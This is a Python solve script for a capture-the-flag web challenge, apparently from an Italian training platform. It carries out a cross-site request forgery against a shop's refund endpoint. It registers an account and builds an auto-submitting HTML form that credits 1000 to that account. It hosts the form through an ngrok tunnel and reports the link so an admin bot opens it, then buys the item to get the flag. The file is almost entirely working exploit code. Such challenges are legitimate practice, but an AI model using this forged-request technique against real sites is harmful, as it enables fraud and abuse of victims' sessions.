#!/usr/bin/env python3
import requests, re, time
from subprocess import Popen, PIPE

SITE = "http://meme_shop_review.challs.olicyber.it/"
REGEX = r"flag{.*?}"
IDREGEX = r"<option value=\"(\d+)\">sos123sos</option>"
MONREGEX = r":(\d+) €"
payload = '''
<html>
    <head>
        <title>^_^</title>
    </head>
    <body>
        <form action="http://meme_shop_review.challs.olicyber.it/refund.php" method="POST">
            <textarea name="user_id">{id}</textarea>
            <textarea name="amount">1000</textarea>
            <textarea name="submit">Riscatta</textarea>
            <button type="submit" id="sas"></button>
        </form>
        <script>document.getElementById("sas").click()</script>
    </body>
</html>
'''.strip() # html da scrivere nel sito dell'attaccante

s = requests.Session()
s.post(SITE + "register.php", data={"username":"sos123sos", "password":"sos123sos", "passwordConfirm":"sos123sos", "submit":"Registrati"})
s.post(SITE + "login.php", data={"username":"sos123sos", "password":"sos123sos", "submit":"Login"})

r = s.get(SITE + "refund.php")
id = re.findall(IDREGEX, r.text)[0]

with open("index.html", "w") as f:
    f.write(payload.format(id=id))
server = Popen(["python3", "-m", "http.server"], stdout=PIPE, stderr=PIPE)
ngrok = Popen(["ngrok", "tcp", "8000"], stdout=PIPE, stderr=PIPE)
time.sleep(2) # letteralmente "aspetta due secondi"
site = requests.get("http://127.0.0.1:4040/api/tunnels").text
print(site)
prefix = str(re.findall(r"tcp://.*?ngrok.io", site)[0]).replace("tcp://", "")
port = str(re.findall(r"ngrok.io:(\d+)", site)[0])
siteUrl = f"http://{prefix}ngrok.io:{port}".replace("ngrok.io:", ":")
print(siteUrl)
s.post(SITE + "report.php", data={"url" : siteUrl, "submit": "Reporta"})
time.sleep(2) # aspetto l'admin ...
r = s.get(SITE)
soldi = re.findall(MONREGEX, r.text)[0]
if soldi == "10":
    print("Error, soldi non riscattati")
else:
    s.post(SITE + "add_to_cart.php", data={"item_id":"1"})
    r = s.post(SITE + "checkout.php")
    if not "flag" in r.text:
        print("Error")
    else:
        flag = re.findall(REGEX, r.text)[0]
        print(flag)
server.kill()
ngrok.kill()